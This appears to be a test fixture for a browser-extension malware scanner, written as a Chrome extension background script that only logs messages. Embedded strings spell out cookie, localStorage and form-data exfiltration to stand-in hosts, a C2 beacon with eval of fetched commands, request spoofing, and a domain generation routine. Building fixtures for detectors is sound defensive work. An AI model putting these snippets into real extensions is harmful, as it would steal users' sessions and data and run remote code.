// TEST EXTENSION: Advanced network malware patterns demonstration

console.log('TEST: Network malware extension background loaded');

// Pattern 1: Suspicious domain communication
function setupSuspiciousDomains() {
  console.log('TEST: Setting up suspicious domain communication');
  
  // Cryptocurrency mining domains
  const miningDomains = [
    'https://coin-hive.com/api/start',
    'https://cryptoloot.pro/miner',
    'https://webmine.pro/start',
    'https://monero-miner.com/api'
  ];
  
  // Data exfiltration domains
  const exfilDomains = [
    'https://exfiltrator.bad/collect',
    'https://stealer.malicious/data',
    'https://harvester.evil/info',
    'https://collector.suspicious/payload'
  ];
  
  // Command & Control domains
  const c2Domains = [
    'https://c2.malware.com/command',
    'https://botnet.evil.org/heartbeat',
    'https://command.control.net/status',
    'https://backdoor.trojan.io/update'
  ];
  
  // Test each domain type
  miningDomains.forEach(domain => {
    console.log(`TEST: Would connect to mining domain: ${domain}`);
  });
  
  exfilDomains.forEach(domain => {
    console.log(`TEST: Would exfiltrate to domain: ${domain}`);
  });
  
  c2Domains.forEach(domain => {
    console.log(`TEST: Would communicate with C2: ${domain}`);
  });
}

// Pattern 2: Suspicious URL patterns
function setupSuspiciousUrls() {
  console.log('TEST: Setting up suspicious URL patterns');
  
  // IP address URLs
  const ipUrls = [
    'http://192.168.1.100:8080/api',
    'https://10.0.0.1:1337/command',
    'http://172.16.0.1:31337/backdoor'
  ];
  
  // Base64 encoded URLs
  const base64Urls = [
    'https://malicious.com/api/base64/YWRtaW4=',
    'https://evil.org/payload/dGVzdA==',
    'https://suspicious.net/data/cGF5bG9hZA=='
  ];
  
  // Unusual ports
  const unusualPorts = [
    'https://malware.com:6666/connect',
    'http://trojan.net:1337/command',
    'https://backdoor.org:31337/control'
  ];
  
  // Long algorithmically generated domains
  const longDomains = [
    'https://abcdefghijklmnopqrstuvwxyz123456789.com/api',
    'https://verylongalgorithmicallygenerateddomainname12345.org/data',
    'https://suspiciouslylongdomainnamethatlooksgenerated.net/command'
  ];
  
  // Uncommon TLDs
  const uncommonTlds = [
    'https://malware.xyz/start',
    'https://trojan.top/connect',
    'https://backdoor.gq/command',
    'https://stealer.tk/data'
  ];
  
  // Test all suspicious URL patterns
  [...ipUrls, ...base64Urls, ...unusualPorts, ...longDomains, ...uncommonTlds].forEach(url => {
    console.log(`TEST: Suspicious URL pattern: ${url}`);
  });
}

// Pattern 3: Bulk request patterns
function setupBulkRequests() {
  console.log('TEST: Setting up bulk request patterns');
  
  // Simulate bulk data harvesting
  const bulkRequestCode = `
    // Bulk request simulation
    const targets = ['user1', 'user2', 'user3', 'user4', 'user5'];
    
    targets.forEach(target => {
      fetch('https://harvester.evil/collect', {
        method: 'POST',
        body: JSON.stringify({ target: target, data: 'sensitive_info' })
      });
    });
    
    // Bulk API calls
    for (let i = 0; i < 100; i++) {
      fetch('https://api.suspicious.com/data/' + i);
    }
    
    // Continuous bulk requests
    setInterval(() => {
      fetch('https://bulk-harvester.malicious/collect');
    }, 1000);
  `;
  
  console.log('TEST: Bulk request patterns prepared');
}

// Pattern 4: Stealth request techniques
function setupStealthRequests() {
  console.log('TEST: Setting up stealth request techniques');
  
  // Random delays
  const randomDelayCode = `
    setTimeout(() => {
      fetch('https://stealth.evil/beacon');
    }, Math.random() * 10000 + 5000);
    
    setInterval(() => {
      fetch('https://hidden.malicious/ping');
    }, Math.random() * 5000 + 2000);
  `;
  
  // User agent spoofing
  const userAgentSpoofing = `
    fetch('https://spoofed.malicious/api', {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '192.168.1.1'
      }
    });
  `;
  
  // Referrer manipulation
  const referrerManipulation = `
    fetch('https://manipulated.evil/data', {
      referrer: 'https://legitimate-site.com',
      referrerPolicy: 'unsafe-url'
    });
  `;
  
  console.log('TEST: Stealth request techniques prepared');
}

// Pattern 5: Data exfiltration patterns
function setupDataExfiltration() {
  console.log('TEST: Setting up data exfiltration patterns');
  
  // Cookie exfiltration
  const cookieExfil = `
    fetch('https://cookie-stealer.malicious/collect', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        domain: window.location.hostname,
        timestamp: Date.now()
      })
    });
  `;
  
  // Local storage exfiltration
  const storageExfil = `
    const storageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      storageData[key] = localStorage.getItem(key);
    }
    
    fetch('https://storage-stealer.evil/collect', {
      method: 'POST',
      body: JSON.stringify(storageData)
    });
  `;
  
  // Form data exfiltration
  const formExfil = `
    const formData = new FormData();
    formData.append('username', 'stolen_user');
    formData.append('password', 'stolen_pass');
    formData.append('credit_card', '1234-5678-9012-3456');
    
    fetch('https://form-stealer.malicious/collect', {
      method: 'POST',
      body: formData
    });
  `;
  
  console.log('TEST: Data exfiltration patterns prepared');
}

// Pattern 6: Command & Control communication
function setupC2Communication() {
  console.log('TEST: Setting up C2 communication patterns');
  
  // Heartbeat/beacon
  const heartbeatCode = `
    setInterval(() => {
      fetch('https://c2.malware.com/heartbeat', {
        method: 'POST',
        body: JSON.stringify({
          status: 'alive',
          id: 'malware_instance_123',
          timestamp: Date.now()
        })
      });
    }, 30000); // 30 second intervals
  `;
  
  // Command execution
  const commandExecution = `
    fetch('https://command.control.net/get_command')
      .then(response => response.json())
      .then(command => {
        if (command.type === 'execute') {
          eval(command.payload);
        }
      });
  `;
  
  // Status reporting
  const statusReporting = `
    fetch('https://status.reporter.malicious/report', {
      method: 'POST',
      body: JSON.stringify({
        system_info: navigator.userAgent,
        installed_extensions: 'malware_extension_v1.0',
        last_activity: Date.now(),
        data_collected: 'sensitive_user_data'
      })
    });
  `;
  
  console.log('TEST: C2 communication patterns prepared');
}

// Pattern 7: Network evasion techniques
function setupEvasionTechniques() {
  console.log('TEST: Setting up network evasion techniques');
  
  // Proxy usage
  const proxyUsage = `
    const proxyConfig = {
      proxy: 'http://proxy.evil.com:8080',
      socks: 'socks5://socks.malicious.com:1080'
    };
  `;
  
  // Custom headers
  const customHeaders = `
    fetch('https://evasion.malicious/api', {
      headers: {
        'X-Custom-Header': 'malicious_payload',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '192.168.1.1',
        'X-Originating-IP': '10.0.0.1'
      }
    });
  `;
  
  // Protocol switching
  const protocolSwitching = `
    const ws = new WebSocket('wss://websocket.malicious.com/stream');
    const ftp = 'ftp://ftp.evil.com/uploads/';
  `;
  
  // Domain generation algorithm
  const dgaCode = `
    const generateDomain = () => {
      const random = Math.random().toString(36).substring(7);
      const timestamp = Date.now().toString(36);
      return 'https://' + random + timestamp + '.com/api';
    };
    
    fetch(generateDomain());
  `;
  
  console.log('TEST: Network evasion techniques prepared');
}

// Pattern 8: Advanced obfuscation in URLs
function setupUrlObfuscation() {
  console.log('TEST: Setting up URL obfuscation');
  
  // Encoded URLs
  const encodedUrls = [
    'https://malicious.com/api%2Fdata%3Fid%3D123',
    'https://evil.org/payload%20with%20spaces',
    'https://suspicious.net/encoded%2Fpath%2Fto%2Fmalware'
  ];
  
  // Double encoding
  const doubleEncoded = [
    'https://malware.com/api%252Fdata%253Fid%253D123',
    'https://trojan.org/double%2520encoded%2520payload'
  ];
  
  // Suspicious query parameters
  const suspiciousParams = [
    'https://backdoor.com/api?cmd=execute&payload=malware',
    'https://stealer.org/data?exec=system&shell=bash',
    'https://malware.net/command?download=payload.exe'
  ];
  
  // Suspicious paths
  const suspiciousPaths = [
    'https://evil.com/admin/backdoor.php',
    'https://malicious.org/wp-admin/malware.js',
    'https://trojan.net/backup/config.json',
    'https://stealer.com/debug/test.exe'
  ];
  
  console.log('TEST: URL obfuscation patterns prepared');
}

// Initialize all network malware patterns
chrome.runtime.onInstalled.addListener(() => {
  console.log('TEST: Network malware extension installed');
  
  setupSuspiciousDomains();
  setupSuspiciousUrls();
  setupBulkRequests();
  setupStealthRequests();
  setupDataExfiltration();
  setupC2Communication();
  setupEvasionTechniques();
  setupUrlObfuscation();
  
  console.log('TEST: All network malware patterns initialized');
});
